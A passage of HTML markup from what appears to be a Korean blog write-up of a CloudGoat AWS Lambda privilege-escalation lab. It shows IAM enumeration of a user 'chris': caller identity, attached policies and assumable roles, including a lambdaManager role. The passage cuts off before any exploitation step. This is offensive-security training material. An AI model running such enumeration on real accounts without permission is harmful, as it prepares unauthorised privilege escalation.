4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit 시나리오</h2>\n<h3 id=\"iam-user-chris-정보를-토대로-사용할-수-있는-권한-나열\" style=\"position:relative;\"><a href=\"#iam-user-chris-%EC%A0%95%EB%B3%B4%EB%A5%BC-%ED%86%A0%EB%8C%80%EB%A1%9C-%EC%82%AC%EC%9A%A9%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-%EA%B6%8C%ED%95%9C-%EB%82%98%EC%97%B4\" aria-label=\"iam user chris 정보를 토대로 사용할 수 있는 권한 나열 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>IAM User: Chris 정보를 토대로 사용할 수 있는 권한 나열</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyElEQVQI1y3M0U6CUACA4VNupSacU0PgaJuEEHKMiSIBNTBS1tp6/9f5u6iL7/YTzfuZ9vRF216o+h/SeqDrBrqPb5q3MxtzIIpztoXGlBZpITGljTkq7h2PmfWIJZfcTlwmdx6iaj4pq57y9cShubBrBuq6Z5tVPK0z4mRPEGbolYsObPyVQgcSHSimM4ebsct46v6HPiJJC1JzxJiC9UvNYlOi/RDXD9HLCL2I8PyI0Dgke5t4J3nObZJcIR/miCuFGEnE9Z9f5iNUnm42NjcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1\"\n        title=\"1\"\n        src=\"/static/8edf254456f8d6c0471053e9cbf14c7a/37523/1.png\"\n        srcset=\"/static/8edf254456f8d6c0471053e9cbf14c7a/e9ff0/1.png 180w,\n/static/8edf254456f8d6c0471053e9cbf14c7a/f21e7/1.png 360w,\n/static/8edf254456f8d6c0471053e9cbf14c7a/37523/1.png 720w,\n/static/8edf254456f8d6c0471053e9cbf14c7a/302a4/1.png 1080w,\n/static/8edf254456f8d6c0471053e9cbf14c7a/4719e/1.png 1330w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABBklEQVQY042RWW+CUBCFrwtqXJCCUFlaIxTZt0IBtTFt+v9/0zEzCX1qmz6czORm5sw3c8XhmMG0A+wMF8bex94K8Gj6MO0QphPCOSQc7aeIa5ZrEyvZgqI+cz5otbGwWBoQbf+FonpHlHSI0w5JdkZWXPHafKCqbwjjlgfSADKZzjRI8x0mksr5IGlOUYWgxjQ/4xQ23Hz0CgTRG7LigiBqoOkuxtMHCLGGGMkYTZQ/JYiCqPygZiP3pWRzovT8itckIjL9j0TTfiIvrwiTFlHawTtVTEpnSLIemn7EbKFzMRH8ZDK8i/EWoqxviLP+m5BWJsI0v7AhfZqsOHyz3wwHs83Wxh090ptQcN9ikwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"2\"\n        title=\"2\"\n        src=\"/static/b6d4484d944999fc544d66d0aedba00d/37523/2.png\"\n        srcset=\"/static/b6d4484d944999fc544d66d0aedba00d/e9ff0/2.png 180w,\n/static/b6d4484d944999fc544d66d0aedba00d/f21e7/2.png 360w,\n/static/b6d4484d944999fc544d66d0aedba00d/37523/2.png 720w,\n/static/b6d4484d944999fc544d66d0aedba00d/302a4/2.png 1080w,\n/static/b6d4484d944999fc544d66d0aedba00d/07a9c/2.png 1440w,\n/static/b6d4484d944999fc544d66d0aedba00d/5fc9a/2.png 1648w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>사용할 수 있는 권한들을 나열한 결과 lambda, rds, ec2등으로 분석을 진행하였고 몇가지 사용 가능한 권한들 중에서 <code class=\"language-text\">get-caller-identity</code> 권한을 이용하여 chris profile의 userid, account, arn을 확인였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">ofile chris\n<span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"UserId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AIDA2MALBVI56QS3BF452\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"Account\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"&lt;USERID>\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:user/chris-lambda_privesc_cgidejvizwx9mo\"</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>chris의 Amazon AWS Resource Name(ARN) 고유한 리소스정보 에대해서 알 수 가 있기 때문에 해당 데이터를 통해 정확한 리소스를 구분이 가능합니다.</li>\n</ul>\n<h3 id=\"lambda-정책-과-관련된-기능-나열\" style=\"position:relative;\"><a href=\"#lambda-%EC%A0%95%EC%B1%85-%EA%B3%BC-%EA%B4%80%EB%A0%A8%EB%90%9C-%EA%B8%B0%EB%8A%A5-%EB%82%98%EC%97%B4\" aria-label=\"lambda 정책 과 관련된 기능 나열 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>lambda 정책 과 관련된 기능 나열</h3>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">User <span class=\"token string\">\"chris-lambda_privesc_cgidejvizwx9mo\"</span> has <span class=\"token number\">1</span> attached policies\nPolicy <span class=\"token string\">\"cg-chris-policy-lambda_privesc_cgidejvizwx9mo\"</span> <span class=\"token punctuation\">(</span>arn<span class=\"token punctuation\">:</span>aws<span class=\"token punctuation\">:</span>iam<span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">&lt;</span>USERID<span class=\"token operator\">></span><span class=\"token punctuation\">:</span>policy<span class=\"token operator\">/</span>cg<span class=\"token operator\">-</span>chris<span class=\"token operator\">-</span>policy<span class=\"token operator\">-</span>lambda_privesc_cgidejvizwx9mo<span class=\"token punctuation\">)</span>\nUser <span class=\"token string\">\"chris-lambda_privesc_cgidejvizwx9mo\"</span> has <span class=\"token number\">0</span> inline policies\nUser <span class=\"token string\">\"chris-lambda_privesc_cgidejvizwx9mo\"</span> has <span class=\"token number\">0</span> groups associated</code></pre></div>\n<ul>\n<li>lambda 기능에 대한 정책이 하나 attached 되어 있는 것을 확인할 수 있고 이에 대한 ARN정보또한 출력이 되는 것을 통해서 해당 권한에 대한 정보를 확인하였습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"AttachedPolicies\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"PolicyName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-chris-policy-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"PolicyArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:policy/cg-chris-policy-lambda_privesc_cgidejvizwx9mo\"</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>앞에서 구한 ARN을 바탕으로 사용자가 생성한 해당 정책에 대해 자세히 알아야 합니다.</li>\n<li>사용자와 Attached된 정책을 열거하기 위해서 Policy ARN을 기반한 version 정보를 조회하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 43.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABB0lEQVQoz5WS2W6DMBREHZYsTcBsAQrBgMAYVBBtoqiq+v/fNZVvlLaP8DDSlWWdueMxu96+IdWMaf4kVfWAJK1RiA6i6pHlLRyewwsEgqiCF5Rw/QLcL2jmviD5YYVz0oDFaQuprsiLAUcnw/4lgWkHMG2fZFjLtTE9MGZwxKmEVDdy1E72LoI+1xfWSEOZYWmqQ7Ea+YHs0iOI6lWb/Rf7GziSV4m36Yvi69hP11VAyr1xKWZ4rknWNvyFrYWy3SGm9nRTJzcn2AP0eMNnMUvBzLRDdP0dohqpnCTr4PALHF7gcEzB2GnVtmyc7mjlBDW8o1Mz/UNRKjRyRNtNKKse2320eMMfpYTSLH0MndcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"3\"\n        title=\"3\"\n        src=\"/static/36851b622044de2eea7cd5b2c79458e8/37523/3.png\"\n        srcset=\"/static/36851b622044de2eea7cd5b2c79458e8/e9ff0/3.png 180w,\n/static/36851b622044de2eea7cd5b2c79458e8/f21e7/3.png 360w,\n/static/36851b622044de2eea7cd5b2c79458e8/37523/3.png 720w,\n/static/36851b622044de2eea7cd5b2c79458e8/302a4/3.png 1080w,\n/static/36851b622044de2eea7cd5b2c79458e8/f3a19/3.png 1086w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 version 정보를 통해서 <code class=\"language-text\">chris</code> 사용자는 <code class=\"language-text\">sts:AssumeRole</code> <code class=\"language-text\">iam:List</code> <code class=\"language-text\">iam:get</code> 에 대한 모든 자원과 권한에 대해 접근이 허용가능한것을 파악할 수 있습니다.</li>\n<li>chris 사용자의 허용가능한 roles에 대해 모두 나열을 하여 몇가지 중요한 정보들을 파악할 수 있습니다.</li>\n<li>elastic-load-balacing, rds, support, trustedadvisor, debug, lambda-manager 권한에 대한 Allow 상태입니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"Roles\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"Path\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"/aws-service-role/elasticloadbalancing.amazonaws.com/\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AWSServiceRoleForElasticLoadBalancing\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AROA2MALBVI57ZZNFYMTY\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/aws-service-role/elasticloadbalancing.amazonaws.com/AWSServiceRoleForElasticLoadBalancing\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"CreateDate\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-14T04:51:17+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AssumeRolePolicyDocument\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2012-10-17\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Statement\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Effect\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Principal\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token string\">\"Service\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"elasticloadbalancing.amazonaws.com\"</span>\n                        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sts:AssumeRole\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Description\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allows ELB to call AWS services on your behalf.\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MaxSessionDuration\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3600</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"Path\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"/aws-service-role/rds.amazonaws.com/\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AWSServiceRoleForRDS\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AROA2MALBVI5TMWNAS337\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/aws-service-role/rds.amazonaws.com/AWSServiceRoleForRDS\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"CreateDate\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-14T04:51:19+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AssumeRolePolicyDocument\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2012-10-17\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Statement\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Effect\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Principal\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token string\">\"Service\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"rds.amazonaws.com\"</span>\n                        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sts:AssumeRole\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Description\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allows Amazon RDS to manage AWS resources on your behalf\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MaxSessionDuration\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3600</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"Path\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"/aws-service-role/support.amazonaws.com/\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AWSServiceRoleForSupport\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AROA2MALBVI52DTL4XEGY\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/aws-service-role/support.amazonaws.com/AWSServiceRoleForSupport\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"CreateDate\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2020-09-10T02:27:38+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AssumeRolePolicyDocument\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2012-10-17\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Statement\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Effect\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Principal\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token string\">\"Service\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"support.amazonaws.com\"</span>\n                        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sts:AssumeRole\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Description\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Enables resource access for AWS to provide billing, administrative and support services\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MaxSessionDuration\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3600</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"Path\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"/aws-service-role/trustedadvisor.amazonaws.com/\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AWSServiceRoleForTrustedAdvisor\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AROA2MALBVI5WDUNGWNAK\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/aws-service-role/trustedadvisor.amazonaws.com/AWSServiceRoleForTrustedAdvisor\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"CreateDate\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2020-09-10T02:27:38+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AssumeRolePolicyDocument\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2012-10-17\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Statement\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Effect\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Principal\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token string\">\"Service\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"trustedadvisor.amazonaws.com\"</span>\n                        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sts:AssumeRole\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Description\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Access for the AWS Trusted Advisor Service to help reduce cost, increase performance, and improve security of your AWS environment.\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MaxSessionDuration\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3600</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"Path\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-debug-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AROA2MALBVI566QQGU2JJ\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/cg-debug-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"CreateDate\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T01:11:47+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AssumeRolePolicyDocument\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2012-10-17\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Statement\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Sid\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Effect\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Principal\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token string\">\"Service\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"lambda.amazonaws.com\"</span>\n                        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sts:AssumeRole\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MaxSessionDuration\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3600</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"Path\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"/\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"RoleId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"AROA2MALBVI52NOERA357\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Arn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/cg-lambdaManager-role-lambda_privesc_cgidejvizwx9mo\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"CreateDate\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-18T01:11:56+00:00\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AssumeRolePolicyDocument\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Version\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2012-10-17\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Statement\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                    <span class=\"token punctuation\">{</span>\n                        <span class=\"token string\">\"Sid\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Effect\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Principal\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token string\">\"AWS\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:user/chris-lambda_privesc_cgidejvizwx9mo\"</span>\n                        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sts:AssumeRole\"</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">]</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MaxSessionDuration\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">3600</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"lambda-manager-debug-정책-조회-및-분석\" style=\"position:relative;\"><a href=\"#lambda-manager-debug-%EC%A0%95%EC%B1%85-%EC%A1%B0%ED%9A%8C-%EB%B0%8F-%EB%B6%84%EC%84%9D\" aria-label=\"lambda manager debug 정책 조회 및 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 